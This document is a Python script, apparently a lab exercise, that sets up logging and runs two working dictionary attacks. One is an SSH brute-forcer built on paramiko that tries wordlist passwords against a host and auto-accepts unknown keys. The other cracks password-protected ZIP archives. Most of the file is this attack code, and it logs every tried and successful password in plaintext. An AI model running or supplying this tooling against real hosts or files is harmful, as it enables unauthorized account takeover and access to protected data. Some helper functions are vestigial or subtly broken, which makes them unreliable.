import os
import time
import logging
import paramiko
import zipfile
from logging.handlers import RotatingFileHandler, StreamHandler

# Function to send emails for ERROR logs (placeholder)
def send_email(log_record):
    # Implement your email sending logic here
    pass

# Custom handler for emailing ERROR logs
class EmailErrorHandler(logging.Handler):
    def emit(self, record):
        if record.levelno == logging.ERROR:
            send_email(record)

# Set up logging
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

# StreamHandler for console output
console_handler = StreamHandler()
console_handler.setLevel(logging.DEBUG)
console_format = logging.Formatter('%(asctime)s %(levelname)s:%(message)s')
console_handler.setFormatter(console_format)
logger.addHandler(console_handler)

# FileHandler for file output
file_handler = RotatingFileHandler('ops26-1.log', maxBytes=1000000, backupCount=5)
file_handler.setLevel(logging.DEBUG)
file_format = logging.Formatter('%(asctime)s %(levelname)s:%(message)s')
file_handler.setFormatter(file_format)
logger.addHandler(file_handler)

# Email handler for ERROR logs
email_handler = EmailErrorHandler()
email_handler.setLevel(logging.ERROR)
logger.addHandler(email_handler)

def read_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='latin-1') as file:
            words = file.readlines()
            logger.info(f"Wordlist read successfully from {file_path}")
            return words
    except FileNotFoundError:
        logger.error(f"File not found: {file_path}")
        return None

def dictionary_iterator(words):
    for word in words:
        word = word.strip()
        logger.debug(f"Word iterated: {word}")
        time.sleep(0.5)

def password_recognized(search_string, words):
    if search_string in words:
        logger.info(f"Search string found: {search_string}")
        return True
    else:
        logger.warning(f"Search string not found: {search_string}")
        return False

def ssh_brute_force(host, username, words):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in words:
        password = password.strip()
        try:
            ssh.connect(host, username=username, password=password)
            logger.info(f"Successful SSH login - Username: {username}, Password: {password}")
            return True
        except paramiko.AuthenticationException:
            logger.warning(f"Failed SSH login attempt - Username: {username}, Password: {password}")
        except paramiko.SSHException as e:
            logger.error(f"SSH error - Username: {username}, Password: {password}: {str(e)}")
        except Exception as e:
            logger.error(f"General error - Username: {username}, Password: {password}: {str(e)}")

    ssh.close()
    return False

def zip_brute_force(zip_file_path, words):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        for password in words:
            password = password.strip()
            try:
                zip_file.extractall(pwd=password.encode())
                logger.info(f"Password cracked: {password}")
                return True
            except Exception as e:
                logger.debug(f"Failed attempt with password: {password}, Error: {str(e)}")
    return False
